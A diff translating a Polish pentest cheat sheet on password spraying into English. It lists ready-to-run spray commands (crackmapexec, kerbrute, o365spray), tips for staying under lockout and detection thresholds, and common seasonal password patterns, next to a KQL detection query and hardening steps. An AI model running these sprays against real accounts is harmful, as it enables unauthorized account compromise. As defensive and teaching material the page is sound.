@@ -12,44 +12,44 @@ author: "core"
 # Password Spraying
 
 ## TL;DR
-Jedno hasło (np. `Sezon2026!`) na wielu kontach — zamiast wielu haseł na jednym. Omija lockout, bo każde konto ma 1 próbę na cykl.
+One password (e.g. `Season2026!`) against many accounts — instead of many passwords against one. Avoids lockout because each account gets 1 attempt per cycle.
 
-## Wymagania / Kontekst
-- Lista użytkowników (z OSINT / enumeracji).
-- Znajomość **polityki lockout** (nigdy nie przekraczaj progu!).
+## Requirements / Context
+- A list of users (from OSINT / enumeration).
+- Knowledge of the **lockout policy** (never cross the threshold!).
 
-## Komendy
+## Commands
 ```bash
-# SMB / AD (CrackMapExec) – uwaga na lockout, --continue-on-success off domyślnie
-crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Sezon2026!' --no-bruteforce
+# SMB / AD (CrackMapExec) – mind lockout, --continue-on-success off by default
+crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Season2026!' --no-bruteforce
 
-# Kerberos pre-auth spray (ciche, nie loguje 4625 tak samo)
-kerbrute passwordspray -d corp.local users.txt 'Sezon2026!'
+# Kerberos pre-auth spray (quiet, doesn't log 4625 the same way)
+kerbrute passwordspray -d corp.local users.txt 'Season2026!'
 
 # OWA / O365
-o365spray --spray -U users.txt -p 'Sezon2026!' --domain corp.com
+o365spray --spray -U users.txt -p 'Season2026!' --domain corp.com
 ```
 
 ## OPSEC
-- **1 hasło na cykl**, odczekaj okno lockout (np. 30 min) między próbami.
-- Rozłóż w czasie; unikaj skanowania wszystkiego naraz.
-- Sezonowe/firmowe wzorce haseł: `Firma123`, `Miesiąc2026!`, `Welcome1`.
+- **1 password per cycle**, wait out the lockout window (e.g. 30 min) between attempts.
+- Spread over time; avoid scanning everything at once.
+- Seasonal/company password patterns: `Company123`, `Month2026!`, `Welcome1`.
 
-## Wykrywanie (Blue Team)
+## Detection (Blue Team)
 ```kql
-// Sentinel / Defender – wiele kont, jedno źródło, nieudane logowania
+// Sentinel / Defender – many accounts, one source, failed logins
 SigninLogs
 | where ResultType != 0
 | summarize FailedAccounts = dcount(UserPrincipalName) by IPAddress, bin(TimeGenerated, 1h)
 | where FailedAccounts > 10
 ```
-- Windows Event **4625** (failed logon) z wielu kont / jedno IP.
+- Windows Event **4625** (failed logon) from many accounts / one IP.
 - Kerberos **4771** (pre-auth failed).
 
-## Mitygacja / Hardening
-- MFA (zabija większość spray'ów).
-- Smart lockout (Azure AD), conditional access, blokada legacy auth.
-- Zakaz słabych/sezonowych haseł (banned password list).
+## Mitigation / Hardening
+- MFA (kills most sprays).
+- Smart lockout (Azure AD), conditional access, block legacy auth.
+- Ban weak/seasonal passwords (banned password list).
 
-## Źródła
+## Sources
 - [MITRE T1110.003](https://attack.mitre.org/techniques/T1110/003/)
